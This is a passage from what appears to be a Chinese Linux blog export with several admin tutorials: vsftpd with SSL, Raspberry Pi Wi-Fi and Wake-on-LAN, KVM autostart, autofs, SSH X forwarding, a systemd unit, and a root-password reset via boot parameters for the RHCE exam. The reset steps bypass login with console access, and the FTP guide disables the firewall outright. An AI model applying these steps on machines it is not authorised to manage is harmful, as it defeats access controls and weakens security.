password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ok 了 配置参数 vsftpd是(very secure FTP)的缩写，是一款咋*nix上非常安全的ftp软件，它基于GPL开发，支持IPV6、SSL加密等等。其安全性主要体现在： 进程分离，处理不同人物的进程是彼此独立运行。 进程均以最小的权限运行。 多数进程使用chroot进行锁定，防止越权访问非法目录。 chroot 是一种改变根的技术，比如我们创建一个/var/ftp/pub/,则该目录对于客户来说就是共享的根目录。 ftp的端口号是21 ftp的工作模式1.主动工作模式 工作步骤： 第一步，客户端随机开启大于1024的端口X与服务器的21端口进行连接通信，建立连接后，客户端可以随时通过该连接通道与服务器进行上传或下载。 第二步，当客户端需要与服务器进行数据传输时，客户端会再开启一个大于1024的随机端口Y，并将Y端口号通过之前的命令通道传送给服务器的21端口 第三步，服务器获取到可短的第二个端口后会主动连接客户端的该端口，通过TCP三次握手后，完成服务器与客户端数据通道的建立，所有数据均通过该端口进行传输。 2.被动模式 第一步，客户端随机开启大于1024的X端口与服务器的21端口进行连接。 第二步，当客户端需要与服务器进行数据传输时候，客户端从命令通道发送数据请求要求上传或下载数据。 第三部，服务器收到数据请求后会随机开启一个端口Y，并且通过命令通道将该端口信息传输给服务端。 第四步，客户端收到服务器发送的端口Y信息，在客户端本地开启一个随机端口Z，此时客户端在主动通过本机的Z端口与服务器的Y端口进行连接，通过TCP三次握手后，进行数据传输 FTP协议需要多个网络端口才可以正常工作，期中一个端口专门用于命令的传输，另一个用于数据的传输。主动模式在传输数据时，服务器会主动连接客户端，被动模式下，客户端主动连接服务器。 为什么会有被动模式？因为客户端大多数主机都在防火墙内，防火墙有可能会阻止端口对外发送数据，这样客户端连接ftp服务器，但是外网不能响应客户端，因此就有了被动模式。 安装yum -y install vsftpd安装完成后，我们关闭防火墙，开启ftp服务 /etc/init.d/vsftpd restart /etc/init.d/iptables stop chkconfig iptables off通过filezilla 去连接，只需要填写主机名就可以匿名连接到ftp服务 配置文件vsftp的配置文件在/etc/vsftpd目录下， [root@elk-node-1 ~]# cd /etc/vsftpd/ [root@elk-node-1 vsftpd]# ls ftpusers user_list vsftpd.conf vsftpd_conf_migrate.sh ftpusers 黑名单 user_list 控制名单（由配置文件控制是白名单还是黑名单） /var/ftp ftp共享目录 /var/log/xferlog 日志文件 主配置文件参数vsftpd的主配置文件是vsftpd.conf # 是否允许匿名登录FTP服务器，默认设置为YES允许 # 用户可使用用户名ftp或anonymous进行ftp登录，口令为用户的E-mail地址。 # 如不允许匿名访问则设置为NO anonymous_enable=YES # 是否允许本地用户(即linux系统中的用户帐号)登录FTP服务器，默认设置为YES允许 # 本地用户登录后会进入用户主目录，而匿名用户登录后进入匿名用户的下载目录/var/ftp/pub # 若只允许匿名用户访问，前面加上#注释掉即可阻止本地用户访问FTP服务器 local_enable=YES # 是否允许本地用户对FTP服务器文件具有写权限，默认设置为YES允许 write_enable=YES # 掩码，本地用户默认掩码为077 # 你可以设置本地用户的文件掩码为缺省022，也可根据个人喜好将其设置为其他值 #local_umask=022 # 是否允许匿名用户上传文件，须将全局的write_enable=YES。默认为YES #anon_upload_enable=YES # 是否允许匿名用户创建新文件夹 #anon_mkdir_write_enable=YES # 是否激活目录欢迎信息功能 # 当用户用CMD模式首次访问服务器上某个目录时，FTP服务器将显示欢迎信息 # 默认情况下，欢迎信息是通过该目录下的.message文件获得的 # 此文件保存自定义的欢迎信息，由用户自己建立 #dirmessage_enable=YES # 是否让系统自动维护上传和下载的日志文件 # 默认情况该日志文件为/var/log/vsftpd.log,也可以通过下面的xferlog_file选项对其进行设定 # 默认值为NO xferlog_enable=YES # Make sure PORT transfer connections originate from port 20 (ftp-data). # 是否设定FTP服务器将启用FTP数据端口的连接请求 # ftp-data数据传输，21为连接控制端口 connect_from_port_20=YES # 设定是否允许改变上传文件的属主，与下面一个设定项配合使用 # 注意，不推荐使用root用户上传文件 #chown_uploads=YES # 设置想要改变的上传文件的属主，如果需要，则输入一个系统用户名 # 可以把上传的文件都改成root属主。whoever：任何人 #chown_username=whoever # 设定系统维护记录FTP服务器上传和下载情况的日志文件 # /var/log/vsftpd.log是默认的，也可以另设其它 #xferlog_file=/var/log/vsftpd.log # 是否以标准xferlog的格式书写传输日志文件 # 默认为/var/log/xferlog，也可以通过xferlog_file选项对其进行设定 # 默认值为NO #xferlog_std_format=YES # 以下是附加配置，添加相应的选项将启用相应的设置 # 是否生成两个相似的日志文件 # 默认在/var/log/xferlog和/var/log/vsftpd.log目录下 # 前者是wu_ftpd类型的传输日志，可以利用标准日志工具对其进行分析；后者是vsftpd类型的日志 #dual_log_enable # 是否将原本输出到/var/log/vsftpd.log中的日志，输出到系统日志 #syslog_enable # 设置数据传输中断间隔时间，此语句表示空闲的用户会话中断时间为600秒 # 即当数据传输结束后，用户连接FTP服务器的时间不应超过600秒。可以根据实际情况对该值进行修改 #idle_session_timeout=600 # 设置数据连接超时时间，该语句表示数据连接超时时间为120秒，可根据实际情况对其个修改 #data_connection_timeout=120 # 运行vsftpd需要的非特权系统用户，缺省是nobody #nopriv_user=ftpsecure # 是否识别异步ABOR请求。 # 如果FTP client会下达“async ABOR”这个指令时，这个设定才需要启用 # 而一般此设定并不安全，所以通常将其取消 #async_abor_enable=YES # 是否以ASCII方式传输数据。默认情况下，服务器会忽略ASCII方式的请求。 # 启用此选项将允许服务器以ASCII方式传输数据 # 不过，这样可能会导致由&quot;SIZE /big/file&quot;方式引起的DoS攻击 #ascii_upload_enable=YES #ascii_download_enable=YES # 登录FTP服务器时显示的欢迎信息 # 如有需要，可在更改目录欢迎信息的目录下创建名为.message的文件，并写入欢迎信息保存后 #ftpd_banner=Welcome to blah FTP service. # 黑名单设置。如果很讨厌某些email address，就可以使用此设定来取消他的登录权限 # 可以将某些特殊的email address抵挡住。 #deny_email_enable=YES # 当上面的deny_email_enable=YES时，可以利用这个设定项来规定哪些邮件地址不可登录vsftpd服务器 # 此文件需用户自己创建，一行一个email address即可 #banned_email_file=/etc/vsftpd/banned_emails # 用户登录FTP服务器后是否具有访问自己目录以外的其他文件的权限 # 设置为YES时，用户被锁定在自己的home目录中，vsftpd将在下面chroot_list_file选项值的位置寻找chroot_list文件 # 必须与下面的设置项配合 #chroot_list_enable=YES # 被列入此文件的用户，在登录后将不能切换到自己目录以外的其他目录 # 从而有利于FTP服务器的安全管理和隐私保护。此文件需自己建立 #chroot_list_file=/etc/vsftpd/chroot_list # 是否允许递归查询。默认为关闭，以防止远程用户造成过量的I/O #ls_recurse_enable=YES # 是否允许监听。 # 如果设置为YES，则vsftpd将以独立模式运行，由vsftpd自己监听和处理IPv4端口的连接请求 listen=YES # 设定是否支持IPV6。如要同时监听IPv4和IPv6端口， # 则必须运行两套vsftpd，采用两套配置文件 # 同时确保其中有一个监听选项是被注释掉的 #listen_ipv6=YES # 设置PAM外挂模块提供的认证服务所使用的配置文件名，即/etc/pam.d/vsftpd文件 # 此文件中file=/etc/vsftpd/ftpusers字段，说明了PAM模块能抵挡的帐号内容来自文件/etc/vsftpd/ftpusers中 #pam_service_name=vsftpd # 是否允许ftpusers文件中的用户登录FTP服务器，默认为NO # 若此项设为YES，则user_list文件中的用户允许登录FTP服务器 # 而如果同时设置了userlist_deny=YES，则user_list文件中的用户将不允许登录FTP服务器，甚至连输入密码提示信息有 #userlist_enable=YES/NO # 设置是否阻扯user_list文件中的用户登录FTP服务器，默认为YES #userlist_deny=YES/NO # 是否使用tcp_wrappers作为主机访问控制方式。 # tcp_wrappers可以实现linux系统中网络服务的基于主机地址的访问控制 # 在/etc目录中的hosts.allow和hosts.deny两个文件用于设置tcp_wrappers的访问控制 # 前者设置允许访问记录，后者设置拒绝访问记录。 # 如想限制某些主机对FTP服务器192.168.57.2的匿名访问，编缉/etc/hosts.allow文件，如在下面增加两行命令： # vsftpd:192.168.57.1:DENY 和vsftpd:192.168.57.9:DENY # 表明限制IP为192.168.57.1/192.168.57.9主机访问IP为192.168.57.2的FTP服务器 # 此时FTP服务器虽可以PING通，但无法连接 tcp_wrappers=YES ##登录方式 vsftp提供3种远程的登录方式： 匿名登录方式 就是不需要用户名，密码。就能登录到服务器电脑里面 本地用户方式 需要帐户名和密码才能登录。而且，这个帐户名和密码，都是在你linux系统里面，已经有的用户。 虚拟用户方式 同样需要用户名和密码才能登录。但是和上面的区别就是，这个用户名和密码，在你linux系统中是没有的(没有该用户帐号) 建立本地账户连接1.修改配置文件 [root@elk-node-1 vsftpd]# cat vsftpd.conf anonymous_enable=NO local_enable=YES write_enable=YES local_umask=022 dirmessage_enable=YES xferlog_enable=YES xferlog_std_format=YES chroot_local_user=YES listen=YES pam_service_name=vsftpd userlist_enable=YES tcp_wrappers=YES重启ftp服务 [root@elk-node-1 vsftpd]# /etc/init.d/vsftpd restart Shutting down vsftpd: [ OK ] Starting vsftpd for vsftpd: [ OK ]2.建立本地用户 # useradd -s /sbin/nologin tom # useradd -s /sbin/nologin awen [root@elk-node-1 vsftpd]# cd /home/ awen/ tom/ [root@elk-node-1 vsftpd]# touch /home/{awen,tom}/test.txt3.连接ftp安装ftp yum -y install ftp连接 [root@elk-node-1 vsftpd]# ftp 127.0.0.1 Connected to 127.0.0.1 (127.0.0.1). 220 (vsFTPd 2.2.2) Name (127.0.0.1:root): awen 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ftp&gt; ftp&gt; dir 227 Entering Passive Mode (127,0,0,1,135,237). 150 Here comes the directory listing. -rw-r--r-- 1 0 0 0 Mar 18 12:24 test.txt 226 Directory send OK.也可以使用filezilla连接 配置SSL由于ftp默认的配置是普通ftp模式，数据都是明文传输，特别是密码也会被明文显示，这个我们可以就上面的配置去登陆抓包看 可以看到，密码完全明文，假如说被非法分子拦截数据包，后果不堪设想，这样我们就需要配置加密的连接，让FTP变得安全些。 首先，在/etc/vsftpd/目录创建一个ssl目录，然后申请证书，参考使用验证 DNS 的方式申请 Let’s encrypt 证书，证书申请完成后，将证书复制到创建的ssl目录中 cp fullchain.cer v0.ftp.v5linux.com.key /etc/vsftpd/ssl/在上面的ftp配置文件中追加 allow_anon_ssl=NO #阻止匿名用户使用 SSL 登录 force_local_data_ssl=YES force_local_logins_ssl=YES require_ssl_reuse=NO 所有的 SSL 数据链接都需重用已经建立的 SSL 会话 ssl_ciphers=HIGH pasv_min_port=40000 pasv_max_port=50000 debug_ssl=YES tcp_wrappers=YES ssl_enable=YES ssl_tlsv1=YES #开启tlsv1 ssl_sslv2=NO ssl_sslv3=NO rsa_cert_file=/etc/vsftpd/ssl/fullchain.cer #设置公钥 rsa_private_key_file=/etc/vsftpd/ssl/v0.ftp.v5linux.com.key #设置私钥该部分配置参考:https://linux.cn/article-8295-1.html 然后重启ftp服务 通过wireshark 抓包看下 最终结果 建立虚拟账户未完待续。。 FTP常见故障一般使用filezilla 连接ftp的话，如果有报错，在地址栏下方的状态区会有提示。 1.530 login incorrect这个说明是账户验证失败 2.500 oops：cannot change directory这种表述无权限切换目录 3.不支持TLS登陆，这种情况可以使用filezilla 选择文件—站点管理器，新建一个站点，然后填写相关信息后，加密方式选择普通FTP模式。 4.报错如下，这种是因为配置文件多了个空格，需要检查下配置文件 # /etc/init.d/vsftpd restart Shutting down vsftpd: [FAILED] Starting vsftpd for vsftpd: 500 OOPS: bad bool value in config file for: allow_anon_ssl [FAILED]","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"},{"name":"ftp","slug":"ftp","permalink":"https://awen.me/tags/ftp/"}]},{"title":"树莓派折腾实现跳板机","slug":"树莓派折腾实现跳板机","date":"2017-06-15T05:10:02.000Z","updated":"2021-02-26T06:05:29.344Z","comments":true,"path":"posts/1981126772.html","link":"","permalink":"https://awen.me/posts/1981126772.html","excerpt":"有个小需求，我希望能够随时随地开启家里的台式机，台式机安装了 centos7 跑了很多 kvm 实例，但是我只希望用的着的时候去开机，没事就关闭，省电（电费贵），家里的路由器是二级路由，不能用 nat 地址转发，也不能用ddns，路由器上我尝试使用 frp，但是没成功，从 github 上看应该是路由器的内核太老了。直接报错，不太好折腾。我还要上网。又不希望电脑一直开着，那样太费电。台式机功耗大。手上有个闲置的树莓派，我就拿来折腾了，上一篇写了怎么安装 Ubuntuserver，后来发现 Ubuntu 的 WiFi 我也折腾了没成功，还是换了官网的迷你版镜像，不带图形界面的，我不需图行界面，只要它安安静静的躺着工作就行。","text":"有个小需求，我希望能够随时随地开启家里的台式机，台式机安装了 centos7 跑了很多 kvm 实例，但是我只希望用的着的时候去开机，没事就关闭，省电（电费贵），家里的路由器是二级路由，不能用 nat 地址转发，也不能用ddns，路由器上我尝试使用 frp，但是没成功，从 github 上看应该是路由器的内核太老了。直接报错，不太好折腾。我还要上网。又不希望电脑一直开着，那样太费电。台式机功耗大。手上有个闲置的树莓派，我就拿来折腾了，上一篇写了怎么安装 Ubuntuserver，后来发现 Ubuntu 的 WiFi 我也折腾了没成功，还是换了官网的迷你版镜像，不带图形界面的，我不需图行界面，只要它安安静静的躺着工作就行。 写入镜像[root@vm-50-156 opt]# dd bs=4M if=2017-04-10-raspbian-jessie-lite.img of=/dev/sdc 309+1 records in 309+1 records out 1297862656 bytes (1.3 GB) copied, 89.8965 s, 14.4 MB/s##连接网络 搜索网络 pi@raspberrypi:~ $ sudo iwlist wlan0 scan wlan0 Scan completed : Cell 01 - Address: E4:F3:F5:87:D7:C6 Channel:1 Frequency:2.412 GHz (Channel 1) Quality=26/70 Signal level=-84 dBm Encryption key:on ESSID:&quot;SuperJBT&quot; Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 9 Mb/s 18 Mb/s; 36 Mb/s; 54 Mb/s Bit Rates:6 Mb/s; 12 Mb/s; 24 Mb/s; 48 Mb/s Mode:Master Extra:tsf=0000000000000000 Extra: Last beacon: 90ms ago IE: Unknown: 000853757065724A4254 IE: Unknown: 010882848B961224486C IE: Unknown: 030101 IE: Unknown: 2A0104 IE: Unknown: 32040C183060 IE: Unknown: 2D1AEE1117FFFF000001000000000000000000000000000000000000 IE: Unknown: 3D1601050000000000000000000000000000000000000000 IE: WPA Version 1 Group Cipher : CCMP Pairwise Ciphers (1) : CCMP Authentication Suites (1) : PSK IE: IEEE 802.11i/WPA2 Version 1 Group Cipher : CCMP Pairwise Ciphers (1) : CCMP Authentication Suites (1) : PSK IE: Unknown: 7F080000000000000000 IE: Unknown: 0B05000000127A IE: Unknown: DD180050F2020101000003A4000027A4000042435E0062322F00 IE: Unknown: 4A0E14000A002C01C800140005001900 IE: Unknown: 0706434E20010D10 IE: Unknown: DD07000C4303000000 Cell 02 - Address: 38:D5:47:2D:30:00 ……不过这个工具不太好用，可以使用一下命令 pi@raspberrypi:~ $ sudo wpa_cli wpa_cli v2.3 Copyright (c) 2004-2014, Jouni Malinen &lt;j@w1.fi&gt; and contributors This software may be distributed under the terms of the BSD license. See README for more details. Selected interface &apos;wlan0&apos; Interactive mode &gt; scan OK &lt;3&gt;CTRL-EVENT-SCAN-STARTED &lt;3&gt;CTRL-EVENT-SCAN-RESULTS &gt; scan_results bssid / frequency / signal level / flags / ssid 38:d5:47:2d:30:00 2442 -49 [WPA2-PSK-CCMP][ESS] wifi 38:d5:47:2d:30:01 2442 -55 [WPA2-PSK-CCMP][ESS] UPYUN 88:25:93:c7:a9:23 2472 -72 [WPA2-PSK-CCMP][ESS] ec:26:ca:0e:49:70 2462 -81 [WPA-PSK-CCMP][WPA2-PSK-CCMP][ESS] chuanshi 8c:f2:28:58:b0:ea 2472 -84 [WPA-PSK-CCMP][WPA2-PSK-CCMP][ESS] MERCURY_B0EA 24:69:68:95:70:44 2412 -86 [WPA-PSK-CCMP][WPA2-PSK-CCMP][ESS] TP-LINK_17-3-501 a4:56:02:38:7d:32 2412 -88 [WPA-PSK-CCMP][WPA2-PSK-CCMP][ESS] Bao 9c:d2:4b:83:f2:40 2412 -89 [WPA-PSK-CCMP][WPS][ESS] ChinaNet-gsCD 40:16:9f:b0:ec:16 2437 -92 [WPA-PSK-CCMP][WPA2-PSK-CCMP][WPS][ESS] smile &gt;搜索到 WiFi 后进行连接 &gt; add_network 1 &gt; set_network 1 ssid &quot;ssid&quot; OK &gt; set_network 1 psk &quot;passwd&quot; OK &gt; set_network 1 key_mgmt &quot;WPA-PSK&quot; FAIL &gt; enable_network 1 OK &gt; save_config OK &gt; quit其实，他就是把配置写到了 pi@raspberrypi:~ $ sudo cat /etc/wpa_supplicant/wpa_supplicant.conf先用有线连接获取到 ip 地址吧，然后在配置 WiFi sudo vi /etc/wpa_supplicant/wpa_supplicant.conf ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1 country=GB network={ ssid=&quot;SSID&quot; psk=&quot;password&quot; #密码带特殊字符会连不上 key_mgmt=WPA-PSK }好了 尽情折腾吧。 pi@raspberrypi:~ $ ifconfig eth0 Link encap:Ethernet HWaddr b8:27:eb:c8:b3:c8 inet addr:192.168.50.77 Bcast:192.168.50.255 Mask:255.255.255.0 inet6 addr: fe80::a986:200c:9f34:dbde/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:76 errors:0 dropped:0 overruns:0 frame:0 TX packets:59 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:12270 (11.9 KiB) TX bytes:9811 (9.5 KiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B) wlan0 Link encap:Ethernet HWaddr b8:27:eb:9d:e6:9d inet addr:192.168.50.86 Bcast:192.168.50.255 Mask:255.255.255.0 inet6 addr: fe80::a644:42d3:dbd5:df25/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:160 errors:0 dropped:107 overruns:0 frame:0 TX packets:48 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:28311 (27.6 KiB) TX bytes:8098 (7.9 KiB)踩到的坑默认情况下运行 sudo raspi-config然后开启 ssh 是可以连接的，但是如果你一来接上图形界面就修改了默认的密码默认用户是pi 密码为raspberry就会被坑了，如果你的密码恰好包含了@之类的，就会一直提示你密码错误。 无线密码也不要使用@。也会踩坑 可以通过 以下命令给密码加密 pi@raspberrypi:~ $ wpa_passphrase &quot;ssid&quot; &quot;password&quot; network={ ssid=&quot;ssid&quot; #psk=&quot;password&quot; psk=44116ea881531996d8a23af58b376d70f196057429c258f529577a26e727ec1b }最好的办法就是使用其他终端软件连接，先用默认用户名登陆 然后在改密码。 可以参考官网的：https://www.raspberrypi.org/documentation/configuration/wireless/wireless-cli.md还有:http://rickgray.me/2015/08/03/useful-command-tool-for-wifi-connection.html 连接外网参考我之前写的 frp https://awen.me/archives/687.html 远程唤醒由于系统是大便系，所以，需要安装wakeonlan sudo apt-get install wakeonlan然后写个脚本赋予可执行权限扔/usr/bin/下就可了 pi@raspberrypi:~ $ cat /usr/bin/wakeonlan-156 #!/bin/bash wakeonlan 14:dd:a9:ea:0b:96其实吧，树莓派1g 内存，只用这么功能还是有点浪费，想想折腾点啥好。 另外，我直接不接电源，把 USB 接口插在路由器上，不然感觉自带的电源太吵了。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"kvm 如何设置开机启动","slug":"kvm-如何设置开机启动","date":"2017-06-15T05:09:03.000Z","updated":"2021-02-26T06:05:29.276Z","comments":true,"path":"posts/1702033000.html","link":"","permalink":"https://awen.me/posts/1702033000.html","excerpt":"除了安装的时候可以指定 --autostart参数外，如果机器已经安装完毕了，我们可以这样操作 操作步骤","text":"除了安装的时候可以指定 --autostart参数外，如果机器已经安装完毕了，我们可以这样操作 操作步骤 1.进入目录 [root@vm-50-156 ~]# cd /etc/libvirt/qemu/ [root@vm-50-156 qemu]# ls autostart node-centos6-1.xml node-server-2.xml node-server-4.xml networks node-server-1.xml node-server-3.xml可以看到有个 autostart 目录，这里面的文件其实都是虚拟机的配置文件的软连接文件 [root@vm-50-156 qemu]# cd autostart/ [root@vm-50-156 autostart]# ls node-server-1.xml node-server-2.xml node-server-3.xml比如我们现在查看 [root@vm-50-156 qemu]# virsh list --all Id Name State ---------------------------------------------------- 1 node-server-3 running 2 node-server-2 running 3 node-server-1 running - node-centos6-1 shut off - node-server-4 shut off发现 node-server-4 和 node-centos6-1 是未开机的，我们将其添加到autostart 目录 [root@vm-50-156 autostart]# ln -s ../node-server-4.xml [root@vm-50-156 autostart]# ln -s ../node-centos6-1.xml [root@vm-50-156 autostart]# ll total 0 lrwxrwxrwx 1 root root 21 May 6 13:22 node-centos6-1.xml -&gt; ../node-centos6-1.xml lrwxrwxrwx 1 root root 35 May 2 19:20 node-server-1.xml -&gt; /etc/libvirt/qemu/node-server-1.xml lrwxrwxrwx 1 root root 35 May 2 19:23 node-server-2.xml -&gt; /etc/libvirt/qemu/node-server-2.xml lrwxrwxrwx 1 root root 35 May 2 19:29 node-server-3.xml -&gt; /etc/libvirt/qemu/node-server-3.xml lrwxrwxrwx 1 root root 20 May 6 13:22 node-server-4.xml -&gt; ../node-server-4.xml然后重启 [root@vm-50-156 qemu]# reboot 再次查看 [root@vm-50-156 ~]# virsh list --all Id Name State ---------------------------------------------------- 1 node-centos6-1 running 2 node-server-4 running 3 node-server-3 running 4 node-server-1 running 5 node-server-2 running可以了","categories":[],"tags":[{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"kvm","slug":"kvm","permalink":"https://awen.me/tags/kvm/"}]},{"title":"centos 7 实现自动按需挂载","slug":"centos-7-实现自动按需挂载","date":"2017-06-15T05:08:18.000Z","updated":"2021-02-26T06:05:29.270Z","comments":true,"path":"posts/586520311.html","link":"","permalink":"https://awen.me/posts/586520311.html","excerpt":"此前我们比如要挂载 nfs，都是将其写到/etc/fstab [root@node-server-1 nfs]# cat /etc/fstab # # /etc/fstab # Created by anaconda on Tue May 2 07:21:59 2017 # # Accessible filesystems, by reference, are maintained under &apos;/dev/disk&apos; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # /dev/mapper/cl-root / xfs defaults 0 0 UUID=fc90e3db-ce52-43d0-ac08-6b8ca4dc25ab /boot xfs defaults 0 0 /dev/mapper/cl-swap swap swap defaults 0 0 192.168.50.156:/opt /mnt nfs defaults 0 0但是，我们并不是每时每刻都在使用这个共享目录，我们可以通过 autofs 实现自动按需挂载，怎么实现呢？ 我们来看下。","text":"此前我们比如要挂载 nfs，都是将其写到/etc/fstab [root@node-server-1 nfs]# cat /etc/fstab # # /etc/fstab # Created by anaconda on Tue May 2 07:21:59 2017 # # Accessible filesystems, by reference, are maintained under &apos;/dev/disk&apos; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # /dev/mapper/cl-root / xfs defaults 0 0 UUID=fc90e3db-ce52-43d0-ac08-6b8ca4dc25ab /boot xfs defaults 0 0 /dev/mapper/cl-swap swap swap defaults 0 0 192.168.50.156:/opt /mnt nfs defaults 0 0但是，我们并不是每时每刻都在使用这个共享目录，我们可以通过 autofs 实现自动按需挂载，怎么实现呢？ 我们来看下。 安装yum -y install autofs配置文件autofs的主要配置文件有两个，分别是/etc下的auto.master和auto.misc。其中，auto.master是起控制作用的，它定义了挂在点和automount动作的文件。其内容如下： [root@node-server-1 etc]# ll auto* -rw-r--r--. 1 root root 13386 Nov 5 14:19 autofs.conf -rw-------. 1 root root 232 Nov 5 14:19 autofs_ldap_auth.conf -rw-r--r--. 1 root root 795 Nov 5 14:19 auto.master -rw-r--r--. 1 root root 524 Nov 5 14:19 auto.misc -rwxr-xr-x. 1 root root 1260 Nov 5 14:19 auto.net -rwxr-xr-x. 1 root root 687 Nov 5 14:19 auto.smb auto.master.d: total 0 [root@node-server-1 etc]#auto.master 配置[root@node-server-1 ~]# vim /etc/auto.master /misc /etc/auto.misc /nfs /etc/auto.nfs # 自定义一条 表示挂载在 nfs 目录下，这个目录不需要你创建，程序会自动创建。 ……auto.nfs 配置1.拷贝 auto.misc文件到 auto.nfs mv /etc/auto.misc /etc/auto.nfs2.编辑 auto.nfs，内容如下 [root@node-server-1 nfs]# cat /etc/auto.nfs # # This is an automounter map and it has the following format # key [ -mount-options-separated-by-comma ] location # Details may be found in the autofs(5) manpage #cd -fstype=iso9660,ro,nosuid,nodev :/dev/cdrom nfs -fstype=nfs 192.168.50.156:/opt #添加这一条，表示挂载到 nfs 目录，文件类型是 nfs 后面是 nfs 的地址 ……3.挂载完之后，重启服务 systemctl restart autofs.service4.然后查看，发现 nfs 目录下什么都没有 [root@node-server-1 nfs]# cd /nfs/ [root@node-server-1 nfs]# ls5.然后，我们 cd nfs 看下，发现就有了，至此，实现了 nfs 的自动挂载。 [root@node-server-1 nfs]# cd nfs [root@node-server-1 nfs]# ls 2017-04-10-raspbian-jessie-lite.img 2017-04-10-raspbian-jessie-lite.zip CentOS-6.8-x86_64-bin-DVD1.iso CentOS-7-x86_64-DVD-1611.iso cn_windows_7_ultimate_with_sp1_x86_dvd_u_677486.iso linux-4.10.14 linux-4.10.14.tar.xz natap.log rh ubuntu-16.04.2-server-amd64.iso ubuntu-16.04-preinstalled-server-armhf+raspi3.img win1064.iso WOL6.设置超时时间，当超时后自动断开 [root@node-server-1 yum.repos.d]# cat /etc/sysconfig/autofs # # Init syatem options # # If the kernel supports using the autofs miscellanous device # and you wish to use it you must set this configuration option # to &quot;yes&quot; otherwise it will not be used. # USE_MISC_DEVICE=&quot;yes&quot; # # Use OPTIONS to add automount(8) command line options that # will be used when the daemon is started. # #OPTIONS=&quot;&quot; TIMEOUT=300 #参考资料http://www.turbolinux.com.cn/turbo/wiki/doku.php?id=%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86:autofs","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"RHCE 考试之破密码之一 二","slug":"RHCE-考试之破密码之二","date":"2017-06-15T05:05:51.000Z","updated":"2021-02-26T06:05:29.264Z","comments":true,"path":"posts/4042599114.html","link":"","permalink":"https://awen.me/posts/4042599114.html","excerpt":"RHCE考试是啥就不介绍了，在此前，我曾介绍过如何去破解系统的密码，如果不清楚，可以参考 RHEL/Centos7 忘记 密码的解决方法 第一种方法如果参加RHCE考试，破密码肯定是必须的，因为你默认不知道root的密码，特别是上半场考试。另外还有一种办法，我们来说下","text":"RHCE考试是啥就不介绍了，在此前，我曾介绍过如何去破解系统的密码，如果不清楚，可以参考 RHEL/Centos7 忘记 密码的解决方法 第一种方法如果参加RHCE考试，破密码肯定是必须的，因为你默认不知道root的密码，特别是上半场考试。另外还有一种办法，我们来说下 在开机进去后，选择第一个内核，按e键盘，找到开机启动的第一个内核配置文件，按ctrk+k 删除ro的o后面的所有内容 ![1.png][1] 替换成，rw是让希望目录默认就用读写的权限 rw,rd.break![2.png][2] 然后按ctrl+x ![3.png][3] 进入shell，依次输入 mount -o remout /sysroot //如果你此前在引导界面修改内核参数只是删了ro后面的内容，而未把ro改成rw，则也可以输入 mount -o remount,rw /sysroot然后输入 passwd root接下来要在根目录创建一个.autorelabel 文件 touch /.autorelabel然后按两次exit 退出重新进入系统 ![4.png][4] 第二种方法centos6 和 centos7的忘记密码的处理方法类似，但是稍微有些区别 步骤 在第一行，按 e 键 然后按键盘上下键盘找到红色标记处 删除并添加 init=/bin/sh ，按 ctrl + x 进入 shell 输入 mount -o remount, rw /遇到selinux 报错 执行 touch /.autorelabel然输入 passwd root 修改密码 执行 exec /sbin/init 重启系统。 视频讲解","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"使用ssh 打开远程图形界面","slug":"使用ssh-打开远程图形界面","date":"2017-06-15T05:05:08.000Z","updated":"2021-02-26T06:05:29.310Z","comments":true,"path":"posts/1606430542.html","link":"","permalink":"https://awen.me/posts/1606430542.html","excerpt":"操作步骤在Linux中使用以下命令进行链接ssh -X username@ip [-p port]","text":"操作步骤在Linux中使用以下命令进行链接ssh -X username@ip [-p port] 使用SecureCRT和xmanager 打开图形界面1.打开Xmanager - Passive 无需要特殊配置 2.然后使用SecureCRT连接目标机器,输入,192.168.50.156 是你物理机的地址 export DISPLAY=192.168.50.156:0.0 后面的0:0 是Xmanager的编号","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"centos 7 创建启动脚本","slug":"centos-7-创建启动脚本","date":"2017-06-15T05:04:22.000Z","updated":"2021-02-26T06:05:29.269Z","comments":true,"path":"posts/988161741.html","link":"","permalink":"https://awen.me/posts/988161741.html","excerpt":"","text":"创建启动脚本[root@ALIYUN-64 /]# vim /etc/systemd/system/frp.service [Unit] Description=frp server #描述信息 [Service] TimeoutStartSec=0 ExecStart=/usr/local/frp/frps -c /usr/local/frp/frps.ini #需要执行的命令 [Install] WantedBy=multi-user.target #运行的级别设置为开机启动 [root@ALIYUN-64 system]# systemctl enable frp Created symlink from /etc/systemd/system/multi-user.target.wants/frp.service to /etc/systemd/system/frp.service. 重启服务 [root@ALIYUN-64 frp]# systemctl restart frp查看状态 [root@ALIYUN-64 frp]# systemctl status frp ● frp.service - frp server Loaded: loaded (/etc/systemd/system/frp.service; enabled; vendor preset: disabled) Active: active (running) since Thu 2017-05-11 14:20:42 CST; 3s ago Main PID: 3399 (frps) CGroup: /system.slice/frp.service └─3399 